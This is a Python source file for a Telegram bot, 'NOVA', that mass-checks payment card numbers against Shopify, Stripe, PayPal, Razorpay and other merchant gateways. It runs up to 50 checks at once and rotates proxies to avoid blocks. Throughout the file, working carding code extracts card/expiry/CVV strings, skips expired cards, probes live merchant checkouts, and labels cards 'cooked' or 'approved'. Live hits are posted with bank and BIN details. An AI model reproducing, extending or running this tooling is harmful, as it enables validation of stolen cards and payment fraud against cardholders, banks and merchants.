#!/usr/bin/env python3
# complete_handler.py – FULLY FIXED (complete version, no cuts)
# - Correct status mapping: EXPIRED, APPROVED, DECLINED, ERROR
# - Retry on any non‑gateway response
# - Price passed correctly
# - /cleanrz removes sites that return server errors
# - All mass and single callbacks included
# - VBV/3DS checker returns detailed dict and formatting function
# - Added handle_clean_my_proxies to fix NameError

import asyncio
import requests, time, threading, random, logging, re, csv, os, urllib3, traceback, json, base64, html, hashlib
import queue as _queue
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FutureTimeoutError
from telebot import types
from datetime import datetime, date

from gates import (
    check_shopify_api,
    process_shopify_api_response,
    check_stripe_api,
    check_stripe_auth,
    check_paypal_charge,
    check_stripe5,
    check_authorize_net,
    check_braintree_b3,
    check_paypal_fixed, check_paypal_general, check_paypal_onyx,
    check_chaos, check_adyen, check_app_auth, check_stripe_onyx,
    check_arcenus, check_stripe_working, check_payflow, check_random,
    check_shopify_onyx, check_skrill, check_random_stripe,
    check_razorpay, check_payu, check_sk_gateway, check_braintree_api,
    check_midasbuy,
    check_vbv_lookup,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OWNER_ID = [5963548505, 5547897619]
FREE_GROUP_ID = -1004293391598

# ============================================================================
# GATEWAY KEYWORDS – used to decide if a response is a real gateway response
# ============================================================================
GATEWAY_KEYWORDS = [
    # Decline reasons
    'CARD_DECLINED', 'DO_NOT_HONOR', 'GENERIC_DECLINE', 'INSUFFICIENT_FUNDS',
    'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED', 'EXPIRED_CARD',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'PAYMENTS_CREDIT_CARD_GENERIC',
    'RESTRICTED_CARD', 'LOST_CARD', 'STOLEN_CARD', 'PICKUP_CARD',
    # Approvals / 3DS
    'ORDER_PLACED', 'APPROVED', 'SUCCESS', '3D', 'AUTHENTICATION_REQUIRED',
    'OTP', 'CHALLENGE', 'REDIRECT', 'VERIFICATION_REQUIRED', 'ACTION_REQUIRED',
    # Also catch "CVV" and "ZIP"
    'CVV', 'ZIP', 'AVS'
]

# ============================================================================
# DECISION RULE BLOCK – maps raw response to final status
# ============================================================================
def categorize_response(response_text):
    """Returns one of: 'APPROVED', 'APPROVED_OTP', 'DECLINED', 'EXPIRED', 'ERROR'"""
    upper = response_text.upper()

    # 1. Expired cards – always EXPIRED
    if any(kw in upper for kw in ['EXPIRED_CARD', 'CREDIT_CARD_BASE_EXPIRED', 'EXPIRED']):
        return 'EXPIRED'

    # 2. Approved / Cooked (charge success)
    if any(kw in upper for kw in ['ORDER_PLACED', 'SUCCESS', 'APPROVED', 'CHARGED']):
        return 'APPROVED'

    # 3. OTP / 3DS (live but needs action)
    if any(kw in upper for kw in ['3D', 'AUTHENTICATION_REQUIRED', 'OTP', 'CHALLENGE', 'REDIRECT', 'ACTION_REQUIRED']):
        return 'APPROVED_OTP'

    # 4. CVV / ZIP mismatch – these are LIVE cards (valid number, just wrong CVV/ZIP)
    if any(kw in upper for kw in ['INCORRECT_CVC', 'INCORRECT_ZIP', 'CVV', 'ZIP', 'AVS']):
        return 'APPROVED'

    # 5. Real declines (do not retry)
    decline_keywords = [
        'CARD_DECLINED', 'DO_NOT_HONOR', 'GENERIC_DECLINE', 'INSUFFICIENT_FUNDS',
        'FRAUD_SUSPECTED', 'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
        'PAYMENTS_CREDIT_CARD_GENERIC', 'RESTRICTED_CARD', 'LOST_CARD', 'STOLEN_CARD',
        'PICKUP_CARD', 'DECLINED'
    ]
    if any(kw in upper for kw in decline_keywords):
        return 'DECLINED'

    # 6. Everything else (site errors, CAPTCHA, proxy issues, etc.) – treat as ERROR
    return 'ERROR'

# ============================================================================
# GLOBAL PLACEHOLDERS – set by setup_complete_handler (from app.py)
# ============================================================================
is_user_allowed = lambda uid: False
load_json_func = lambda key, default: default
save_json_func = lambda key, data: None
users_file = "users.json"
user_sessions = {}

# ============================================================================
# RATE LIMITER
# ============================================================================
class RateLimiter:
    def __init__(self, max_calls=25, period=1.0):
        self.max_calls = max_calls
        self.period = period
        self.calls = []
        self.lock = threading.Lock()
    def wait(self):
        with self.lock:
            now = time.time()
            self.calls = [t for t in self.calls if t > now - self.period]
            if len(self.calls) >= self.max_calls:
                sleep_time = self.calls[0] + self.period - now
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self.calls.append(time.time())
rate_limiter = RateLimiter()

from telebot.apihelper import ApiTelegramException
def safe_send(bot_func, *args, **kwargs):
    rate_limiter.wait()
    while True:
        try:
            return bot_func(*args, **kwargs)
        except ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = e.result_json.get('parameters', {}).get('retry_after', 5)
                logging.warning(f"Rate limited (429). Waiting {retry_after}s")
                time.sleep(retry_after)
                rate_limiter.wait()
                continue
            elif e.error_code in [400, 403]:
                logging.warning(f"Ignored Telegram API Error: {e.description}")
                return None
            else:
                raise

# ============================================================================
# BACKGROUND HIT SENDER (non‑blocking)
# ============================================================================
_hit_queue = _queue.Queue()
_hit_sender_started = False
_hit_sender_lock = threading.Lock()
_hit_sender_bot = None

def _hit_sender_worker():
    global _hit_sender_bot
    while True:
        try:
            target_chat, msg = _hit_queue.get(timeout=120)
            if _hit_sender_bot:
                safe_send(_hit_sender_bot.send_message, target_chat, msg, parse_mode='HTML')
        except _queue.Empty:
            continue
        except Exception as e:
            logging.warning(f"Hit sender error: {e}")

def queue_hit(bot, target_chat, msg):
    global _hit_sender_started, _hit_sender_bot
    with _hit_sender_lock:
        _hit_sender_bot = bot
        if not _hit_sender_started:
            t = threading.Thread(target=_hit_sender_worker, daemon=True)
            t.start()
            _hit_sender_started = True
    _hit_queue.put((target_chat, msg))

# ============================================================================
# STOP COMMAND HANDLING – PER USER
# ============================================================================
stop_events = {}
stop_lock = threading.Lock()

def get_stop_key(chat_id, user_id):
    return f"{chat_id}:{user_id}"

def set_stop(chat_id, user_id):
    with stop_lock:
        key = get_stop_key(chat_id, user_id)
        stop_events[key] = True

def clear_stop(chat_id, user_id):
    with stop_lock:
        key = get_stop_key(chat_id, user_id)
        stop_events.pop(key, None)

def is_stop_requested(chat_id, user_id):
    with stop_lock:
        key = get_stop_key(chat_id, user_id)
        return stop_events.get(key, False)

# ============================================================================
# CONCURRENCY CONTROL
# ============================================================================
user_busy = {}
user_busy_lock = threading.Lock()
BUSY_TIMEOUT = 600
def is_user_busy(user_id):
    with user_busy_lock:
        entry = user_busy.get(user_id)
        if not entry:
            return False
        if entry['busy'] and time.time() - entry['since'] > BUSY_TIMEOUT:
            user_busy[user_id] = {'busy': False, 'since': 0}
            return False
        return entry['busy']
def set_user_busy(user_id, busy):
    with user_busy_lock:
        user_busy[user_id] = {'busy': busy, 'since': time.time() if busy else 0}
MAX_CONCURRENT_CHECKS = 30
mass_check_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKS)

# ============================================================================
# PROXY CHECKING + CACHE
# ============================================================================
proxy_cache = {}
proxy_cache_lock = threading.Lock()
PROXY_CACHE_TTL = 300
def check_proxy_live(proxy):
    def _test():
        try:
            parts = proxy.strip().split(':')
            if len(parts) == 2:
                formatted = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                return None
            proxies_dict = {'http': formatted, 'https': formatted}
            r = requests.get("https://api.ipify.org/", proxies=proxies_dict, timeout=10, verify=False)
            if r.status_code == 200:
                return proxy
        except:
            pass
        return None
    with ThreadPoolExecutor(max_workers=1) as ex:
        future = ex.submit(_test)
        try:
            return future.result(timeout=12)
        except:
            return None

def validate_proxies_strict(proxies, bot, message):
    if not proxies:
        return []
    live_proxies = []
    now = time.time()
    to_test = []
    with proxy_cache_lock:
        for p in proxies:
            if p in proxy_cache and now - proxy_cache[p]['time'] < PROXY_CACHE_TTL:
                if proxy_cache[p]['live']:
                    live_proxies.append(p)
            else:
                to_test.append(p)
    if not to_test:
        return live_proxies
    total = len(to_test)
    status_msg = safe_send(bot.send_message, message.chat.id, f"🛡️ Testing {total} proxies...", parse_mode='HTML')
    tested = 0
    newly_live = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_proxy = {executor.submit(check_proxy_live, p): p for p in to_test}
        for future in as_completed(future_to_proxy):
            tested += 1
            try:
                result = future.result(timeout=15)
                p = future_to_proxy[future]
                with proxy_cache_lock:
                    proxy_cache[p] = {'live': bool(result), 'time': now}
                if result:
                    newly_live.append(p)
            except Exception:
                p = future_to_proxy[future]
                with proxy_cache_lock:
                    proxy_cache[p] = {'live': False, 'time': now}
            if tested % 10 == 0 and status_msg:
                try:
                    safe_send(bot.edit_message_text,
                        f"🛡️ Testing proxies: {tested}/{total}\n✅ Live: {len(live_proxies)+len(newly_live)}",
                        message.chat.id, status_msg.message_id, parse_mode='HTML')
                except:
                    pass
    if status_msg:
        safe_send(bot.delete_message, message.chat.id, status_msg.message_id)
    live_proxies.extend(newly_live)
    return live_proxies

# ============================================================================
# LOGGING
# ============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)

# ============================================================================
# BIN DATABASE (with in-memory cache)
# ============================================================================
BINS_CSV_FILE = 'bins_all.csv'
BIN_DB = {}
_bin_cache = {}
_bin_cache_lock = threading.Lock()

def load_bin_database():
    global BIN_DB
    if not os.path.exists(BINS_CSV_FILE):
        return
    try:
        with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            next(reader, None)
            for row in reader:
                if len(row) >= 6:
                    BIN_DB[row[0].strip()] = {
                        'country_name': row[1].strip(),
                        'country_flag': get_flag_emoji(row[1].strip()),
                        'brand': row[2].strip(),
                        'type': row[3].strip(),
                        'level': row[4].strip(),
                        'bank': row[5].strip()
                    }
    except Exception as e:
        logger.error(f"Error loading BIN CSV: {e}")

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])

load_bin_database()

def get_bin_info(card_number):
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]
    with _bin_cache_lock:
        if bin_code in _bin_cache:
            return _bin_cache[bin_code]
    result = None
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            result = {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except:
        pass
    if not result:
        result = BIN_DB.get(bin_code, {
            'country_name': 'Unknown', 'country_flag': '🇺🇳',
            'bank': 'UNKNOWN', 'brand': 'UNKNOWN',
            'type': 'UNKNOWN', 'level': 'UNKNOWN'
        })
    with _bin_cache_lock:
        _bin_cache[bin_code] = result
    return result

def extract_cards_from_text(text):
    valid_ccs = []
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if len(line) < 15: continue
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            if len(yyyy) == 2: yyyy = "20" + yyyy
            mm = mm.zfill(2)
            if 1 <= int(mm) <= 12:
                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    return list(set(valid_ccs))

def format_progress_bar(processed, total, length=12):
    if total == 0: return ""
    percent = processed / total
    filled = int(length * percent)
    bar = '█' * filled + '▒' * (length - filled)
    return f"<code>{bar}</code> <b>{processed}/{total}</b>"

def remove_expired_cards(ccs):
    """Filter out expired cards based on current date."""
    valid_ccs = []
    now = datetime.now()
    current_year = now.year
    current_month = now.month
    for cc_str in ccs:
        try:
            parts = cc_str.split('|')
            if len(parts) < 4: continue
            cc, mm, yyyy, cvv = parts[0], parts[1], parts[2], parts[3]
            month = int(mm)
            year = int(yyyy)
            if year < 100:
                year += 2000
            if year > current_year or (year == current_year and month >= current_month):
                valid_ccs.append(cc_str)
        except ValueError:
            continue
    return valid_ccs

# ============================================================================
# USAGE TRACKING
# ============================================================================
def reset_usage_if_needed(user_data):
    today = date.today().isoformat()
    if user_data.get('last_usage_reset') != today:
        user_data['usage_today'] = 0
        user_data['last_usage_reset'] = today

def get_user_upload_limit(user_id, load_json_func, users_file):
    users_data = load_json_func(users_file, {})
    user_info = users_data.get(str(user_id), {})
    return user_info.get('limit', 50000)

def get_user_daily_remaining(user_id, load_json_func, users_file):
    users_data = load_json_func(users_file, {})
    user_info = users_data.get(str(user_id), {})
    if not user_info:
        return 100000
    reset_usage_if_needed(user_info)
    daily_limit = user_info.get('daily_limit', 100000)
    used = user_info.get('usage_today', 0)
    return max(0, daily_limit - used)

def increment_usage(user_id, amount, load_json_func, save_json_func, users_file):
    users_data = load_json_func(users_file, {})
    user_info = users_data.get(str(user_id))
    if not user_info:
        return
    reset_usage_if_needed(user_info)
    user_info['usage_today'] = user_info.get('usage_today', 0) + amount
    save_json_func(users_file, users_data)

# ============================================================================
# USER PREFERENCES (individual vs final)
# ============================================================================
USER_PREFS_FILE = "user_prefs.json"
def load_user_prefs():
    try:
        with open(USER_PREFS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}
def save_user_prefs(prefs):
    with open(USER_PREFS_FILE, 'w') as f:
        json.dump(prefs, f, indent=2)
def get_user_preference(user_id):
    prefs = load_user_prefs()
    return prefs.get(str(user_id), "individual")
def set_user_preference(user_id, mode):
    prefs = load_user_prefs()
    prefs[str(user_id)] = mode
    save_user_prefs(prefs)

# ============================================================================
# PERSONAL SITES (Shopify) – for user‑specific sites
# ============================================================================
USER_SITES_FILE = "user_sites.json"
def load_user_sites():
    try:
        with open(USER_SITES_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}
def save_user_sites(data):
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(data, f, indent=2)
def get_user_sites(user_id):
    data = load_user_sites()
    return data.get(str(user_id), [])
def save_user_sites_list(user_id, sites_list):
    data = load_user_sites()
    data[str(user_id)] = sites_list
    save_user_sites(data)

def stop_button_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⏹ Stop", callback_data="stop_mass"))
    return markup

def gate_with_proxy_retry(gate_func, cc, proxies, gate_name="", max_retries=3):
    available = list(proxies)
    last_error = None
    for attempt in range(max_retries):
        if not available:
            break
        proxy = random.choice(available)
        try:
            result = gate_func(cc, proxy=proxy)
            if isinstance(result, tuple) and len(result) == 2:
                msg, status = result
            else:
                msg, status = str(result), "ERROR"
            error_keywords = [
                "proxy error", "503", "service unavailable",
                "server disconnected", "timeout", "connection refused",
                "failed to get session token", "site error! status: 402",
                "error processing card", "api error", "not shopify",
                "proxy error: 503", "remote end closed",
                "could not connect", "no route to host"
            ]
            if status == "ERROR" and any(kw in msg.lower() for kw in error_keywords):
                if proxy in available:
                    available.remove(proxy)
                last_error = msg
                continue
            return msg, status, proxy
        except Exception as e:
            if proxy in available:
                available.remove(proxy)
            last_error = str(e)
            continue
    error_detail = (last_error[:80] if last_error else "no proxies available")
    return f"All proxies failed (last: {error_detail})", "ERROR", None

# ============================================================================
# RAZORPAY SITE STORAGE (global)
# ============================================================================
RZ_SITES_KEY = "rz_sites.json"
RZ_FAIL_COUNTS_KEY = "rz_fail_counts.json"

def load_rz_sites():
    return load_json_func(RZ_SITES_KEY, [])
def save_rz_sites(sites):
    save_json_func(RZ_SITES_KEY, sites)
def load_rz_fail_counts():
    return load_json_func(RZ_FAIL_COUNTS_KEY, {})
def save_rz_fail_counts(counts):
    save_json_func(RZ_FAIL_COUNTS_KEY, counts)
def increment_rz_fail_count(site):
    counts = load_rz_fail_counts()
    counts[site] = counts.get(site, 0) + 1
    save_rz_fail_counts(counts)
    if counts[site] >= 3:
        sites = load_rz_sites()
        if site in sites:
            sites.remove(site)
            save_rz_sites(sites)
            return True
    return False
def reset_rz_fail_count(site):
    counts = load_rz_fail_counts()
    if site in counts:
        del counts[site]
    save_rz_fail_counts(counts)

def is_valid_razorpay_url(url):
    return url.startswith("https://razorpay.me/") and len(url) > 20

def validate_razorpay_site(url):
    if not is_valid_razorpay_url(url):
        return False, "Invalid URL format. Must start with https://razorpay.me/"
    try:
        resp = requests.head(url, timeout=8, allow_redirects=True)
        if 200 <= resp.status_code < 400:
            return True, "OK"
        else:
            return False, f"Site returned status {resp.status_code}"
    except requests.exceptions.RequestException as e:
        return False, f"Connection error: {e}"

def safe_update_progress(bot, chat_id, status_msg, msg_text):
    if status_msg is None:
        new_msg = safe_send(bot.send_message, chat_id, msg_text,
                            parse_mode="HTML", reply_markup=stop_button_markup())
        return new_msg if new_msg else status_msg
    try:
        safe_send(bot.edit_message_text, msg_text, chat_id, status_msg.message_id,
                  parse_mode="HTML", reply_markup=stop_button_markup())
        return status_msg
    except Exception:
        new_msg = safe_send(bot.send_message, chat_id, msg_text,
                            parse_mode="HTML", reply_markup=stop_button_markup())
        return new_msg if new_msg else status_msg

# ============================================================================
# SHOPIFY MASS CHECK – FIXED with proper retry and categorisation
# ============================================================================
def process_shopify_mass_check(bot, message, start_msg, ccs, site_list, proxies,
                               user_id, load_json_func, save_json_func, users_file, hit_pref="both", dm_target_user_id=None):
    original_count = len(ccs)
    ccs = remove_expired_cards(ccs)
    expired_skipped = original_count - len(ccs)
    chat_id = message.chat.id
    if expired_skipped > 0:
        safe_send(bot.send_message, chat_id, f"🧹 Skipped {expired_skipped} expired cards.")

    send_every_hit = (get_user_preference(user_id) == "individual")
    total = len(ccs)
    results = {"cooked": [], "approved": [], "dead": [], "expired": [], "error": []}
    sites_lock = threading.Lock()
    temp_site_ban = {}
    TEMP_BAN_TIME = 120
    current_sites = site_list.copy()
    current_proxies = proxies.copy()
    clear_stop(chat_id, user_id)
    unchecked_ccs = []
    stopped = False
    last_response = None
    status_msg = start_msg

    def error_result(cc, reason):
        return {
            'cc': cc, 'response': reason, 'status': 'ERROR', 'gateway': 'Unknown',
            'price': '0.00', 'site': 'N/A', 'site_url': 'N/A', 'site_obj': {},
            'proxy_used': None,
            'bin_info': get_bin_info(cc.split('|')[0]), 'timestamp': datetime.now().isoformat()
        }

    def check_card_concurrent(cc, site_list, proxy_list, max_retries=3):
        nonlocal last_response
        if is_stop_requested(chat_id, user_id):
            return error_result(cc, "Stopped by user"), True

        available_proxies = list(proxy_list)
        tried_sites = set()

        for _ in range(max_retries):
            if is_stop_requested(chat_id, user_id):
                return error_result(cc, "Stopped by user"), True

            with sites_lock:
                now = time.time()
                candidates = []
                for s in site_list:
                    url = s['url']
                    if url in temp_site_ban and now < temp_site_ban[url]:
                        continue
                    if url not in tried_sites:
                        candidates.append(s)
                if not candidates:
                    break
                site_obj = random.choice(candidates)
                site_url = site_obj['url']
                site_name = site_obj.get('name', site_url)
                price = site_obj.get('price', '0.00')
                gateway = site_obj.get('gateway', 'Unknown')

            tried_sites.add(site_url)

            while available_proxies:
                if is_stop_requested(chat_id, user_id):
                    return error_result(cc, "Stopped by user"), True

                proxy = random.choice(available_proxies)
                try:
                    api_resp = check_shopify_api(site_url, cc, proxy)
                    response_text, raw_status, gateway_result = process_shopify_api_response(api_resp, price)
                    last_response = response_text
                    resp_upper = (response_text or "").upper()

                    # 1. Check if this is a real gateway response using our decision block
                    final_status = categorize_response(response_text)

                    # If we got a real gateway response (not ERROR), return it
                    if final_status != 'ERROR':
                        bin_info = get_bin_info(cc.split('|')[0])
                        return {
                            'cc': cc,
                            'response': response_text,
                            'status': final_status,
                            'gateway': gateway_result or gateway,
                            'price': price,
                            'site': site_name,
                            'site_url': site_url,
                            'site_obj': site_obj,
                            'proxy_used': proxy,
                            'bin_info': bin_info,
                            'timestamp': datetime.now().isoformat()
                        }, False

                    # 2. If it's ERROR, check if it's a site-level error (like CAPTCHA, proxy error)
                    # We treat any non-gateway response as a site error – retry with next site/proxy
                    if proxy in available_proxies:
                        available_proxies.remove(proxy)
                    # Optionally ban the site temporarily
                    with sites_lock:
                        temp_site_ban[site_url] = time.time() + TEMP_BAN_TIME
                    break  # break out of proxy loop, will pick next site

                except Exception as e:
                    if proxy in available_proxies:
                        available_proxies.remove(proxy)
                    continue

            # If we exhausted proxies, try next site with fresh proxy list
            # (we already added site to temp ban, so it will skip it for a while)
            continue  # will pick next site

        # If all sites failed
        return error_result(cc, "All sites/proxies exhausted"), False

    processed = 0
    start_time = time.time()
    last_update_time = time.time()
    status_msg = start_msg

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {}
        for i, cc in enumerate(ccs):
            if is_stop_requested(chat_id, user_id):
                unchecked_ccs = ccs[i:]
                stopped = True
                break
            future = executor.submit(check_card_concurrent, cc, current_sites, current_proxies, 3)
            futures[future] = cc

        for future in as_completed(futures):
            if is_stop_requested(chat_id, user_id):
                for f in futures:
                    if not f.done():
                        f.cancel()
                stopped = True
            processed += 1
            try:
                timeout = 15 if is_stop_requested(chat_id, user_id) else 120
                res, card_stopped = future.result(timeout=timeout)
                if card_stopped:
                    cc = futures[future]
                    unchecked_ccs.insert(0, cc)
                    stopped = True
                    break
                status = res['status']
                if status == 'APPROVED':
                    results['cooked'].append(res)
                    if send_every_hit and (hit_pref == "both" or hit_pref == "cooked"):
                        send_hit(bot, chat_id, res, "🔥 COOKED", dm_user_id=dm_target_user_id)
                elif status == 'APPROVED_OTP':
                    results['approved'].append(res)
                    if send_every_hit and (hit_pref == "both" or hit_pref == "approved"):
                        send_hit(bot, chat_id, res, "✅ APPROVED (OTP)", dm_user_id=dm_target_user_id)
                elif status == 'EXPIRED':
                    results['expired'].append(res)
                elif status == 'DECLINED':
                    results['dead'].append(res)
                else:
                    results['error'].append(res)
            except FutureTimeoutError:
                cc = futures[future]
                results['error'].append(error_result(cc, 'Timeout'))
            except Exception as e:
                cc = futures[future]
                results['error'].append(error_result(cc, str(e)))

            now = time.time()
            if now - last_update_time > 5.0 or processed == len(futures) or stopped:
                try:
                    elapsed = now - start_time
                    cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                    avg_time = elapsed / processed if processed > 0 else 0
                    progress_bar = format_progress_bar(processed, total)
                    lr = html.escape(str(last_response or "N/A"))[:40] + ("…" if last_response and len(str(last_response))>40 else "")
                    msg_text = (
                        f"<b>🛍️ Shopify Multi‑Site</b>\n"
                        f"{progress_bar}\n\n"
                        f"🔥 Cooked: {len(results['cooked'])}  ✅ Approved: {len(results['approved'])}\n"
                        f"❌ Dead: {len(results['dead'])}  👋 Expired: {len(results['expired'])}\n"
                        f"⚠️ Errors: {len(results['error'])}\n\n"
                        f"⏱️ Last: {lr}\n"
                        f"⚡ {cpm:.1f} CPM | 🔥 {avg_time:.1f}s avg\n\n"
                        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                    )
                    status_msg = safe_update_progress(bot, chat_id, status_msg, msg_text)
                    last_update_time = time.time()
                except Exception as e:
                    logger.warning(f"Shopify progress update failed: {e}")

            if stopped:
                break

    clear_stop(chat_id, user_id)
    increment_usage(user_id, processed, load_json_func, save_json_func, users_file)

    duration = time.time() - start_time
    final_text = (
        f"<b>{'⏸️ Stopped' if stopped else '✅ Shopify Completed'}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💳 Checked: {processed}\n"
        f"🔥 Cooked: {len(results['cooked'])} | ✅ Approved: {len(results['approved'])}\n"
        f"❌ Dead: {len(results['dead'])} | 👋 Expired: {len(results['expired'])}\n"
        f"⚠️ Errors: {len(results['error'])}\n"
        f"⏱️ Time: {duration:.2f}s\n\n"
        f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
    )
    if status_msg:
        try:
            safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")
    else:
        safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

    target = dm_target_user_id if dm_target_user_id else chat_id
    for key, caption, prefix in [
        ('cooked', '🔥 Cooked cards', 'cooked'),
        ('approved', '✅ Approved (Live)', 'approved'),
        ('expired', '👋 Expired cards', 'expired'),
        ('dead', '❌ Dead cards', 'dead'),
        ('error', '⚠️ Errors', 'errors')
    ]:
        items = results.get(key, [])
        if items:
            text = "\n".join([f"{r['cc']} | {r['response']}" for r in items])
            fname = f"{prefix}_{chat_id}_{user_id}.txt"
            with open(fname, 'w') as f: f.write(text)
            with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption=caption)
            try:
                os.remove(fname)
            except:
                pass

    if unchecked_ccs:
        unchecked_text = "\n".join(unchecked_ccs)
        fname = f"unchecked_{chat_id}_{user_id}.txt"
        with open(fname, 'w') as f: f.write(unchecked_text)
        with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption="📋 Unchecked (stopped)")
        try:
            os.remove(fname)
        except:
            pass

def send_hit(bot, chat_id, res, title, dm_user_id=None):
    target_chat = dm_user_id if dm_user_id else chat_id
    try:
        bin_info = res['bin_info']
        site_obj = res.get('site_obj', {})
        site_id = site_obj.get('id')
        site_display = f"ID {site_id}" if site_id else res.get('site_url', 'N/A').replace('https://','').replace('http://','').split('/')[0]
        header_emoji = "🔥" if "COOKED" in title else "✅"
        escaped_response = html.escape(res['response'])
        price = res.get('price', '0.00')
        msg = (
            f"<b>{header_emoji} {title} HIT!</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"💳 <b>Card:</b> <code>{res['cc']}</code>\n"
            f"📋 <b>Response:</b> {escaped_response}\n"
            f"🛡️ <b>Gateway:</b> {res['gateway']} · <b>${price}</b>\n"
            f"🌐 <b>Site:</b> {site_display}\n"
            f"━━━━━━━━━━━━━━\n"
            f"🏦 <b>Bank:</b> <b>{bin_info.get('bank','UNKNOWN')}</b>\n"
            f"🌍 <b>Country:</b> {bin_info.get('country_name','UNKNOWN')} {bin_info.get('country_flag','🇺🇳')}\n"
            f"💠 <b>Brand:</b> {bin_info.get('brand','UNKNOWN')} {bin_info.get('type','UNKNOWN')}\n"
            f"━━━━━━━━━━━━━━\n"
            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
        )
        if len(msg) > 4096:
            msg = msg[:4090] + "…"
        queue_hit(bot, target_chat, msg)
    except Exception as e:
        logger.error(f"Error sending hit: {e}")

# ============================================================================
# GENERIC MASS CHECK ENGINE (for PayPal, Stripe, etc.) – with same categorisation
# ============================================================================
def process_gate_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                            proxies, user_id, load_json_func, save_json_func, users_file, dm_target_user_id=None):
    original_count = len(ccs)
    ccs = remove_expired_cards(ccs)
    expired_skipped = original_count - len(ccs)
    chat_id = message.chat.id
    if expired_skipped > 0:
        safe_send(bot.send_message, chat_id, f"🧹 Skipped {expired_skipped} expired cards.")

    send_every_hit = (get_user_preference(user_id) == "individual")
    total = len(ccs)
    results = {"cooked": [], "approved": [], "declined": [], "expired": [], "error": []}
    clear_stop(chat_id, user_id)
    unchecked_ccs = []
    stopped = False
    last_response = None
    status_msg = start_msg

    def worker(cc):
        nonlocal last_response
        if is_stop_requested(chat_id, user_id):
            return cc, "Stopped by user", "STOPPED"
        if proxies:
            msg, status, _ = gate_with_proxy_retry(gate_func, cc, proxies, gate_name)
        else:
            try:
                result = gate_func(cc, proxy=None)
                if isinstance(result, tuple) and len(result) == 2:
                    msg, status = result
                else:
                    msg, status = str(result), "ERROR"
            except Exception as e:
                msg, status = str(e), "ERROR"
        last_response = msg
        # For generic gates, we rely on their returned status (they already map)
        return cc, msg, status

    processed = 0
    start_time = time.time()
    last_update_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {}
        for i, cc in enumerate(ccs):
            if is_stop_requested(chat_id, user_id):
                unchecked_ccs = ccs[i:]
                stopped = True
                break
            future = executor.submit(worker, cc)
            futures[future] = cc

        for future in as_completed(futures):
            if is_stop_requested(chat_id, user_id):
                for f in futures:
                    if not f.done():
                        f.cancel()
                stopped = True
            processed += 1
            try:
                timeout = 10 if is_stop_requested(chat_id, user_id) else 60
                cc, msg, status = future.result(timeout=timeout)
                if status == 'STOPPED':
                    unchecked_ccs.insert(0, cc)
                    stopped = True
                    break
                bin_info = get_bin_info(cc.split('|')[0])
                target = dm_target_user_id if dm_target_user_id else chat_id
                safe_msg = html.escape(msg)
                if status == 'APPROVED':
                    results['cooked'].append((cc, msg))
                    if send_every_hit:
                        hit_msg = (
                            f"<b>🔥 COOKED {gate_name} HIT!</b>\n"
                            f"━━━━━━━━━━━━━━\n"
                            f"💳 <code>{cc}</code>\n"
                            f"📋 {safe_msg}\n"
                            f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
                            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','🇺🇳')}\n"
                            f"━━━━━━━━━━━━━━\n"
                            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
                        )
                        queue_hit(bot, target, hit_msg)
                elif status == 'DECLINED':
                    results['declined'].append((cc, msg))
                elif status == 'EXPIRED':
                    results['expired'].append((cc, msg))
                else:
                    results['error'].append((cc, msg))
            except FutureTimeoutError:
                cc = futures[future]
                results['error'].append((cc, "Timeout"))
            except Exception as e:
                cc = futures[future]
                results['error'].append((cc, str(e)))

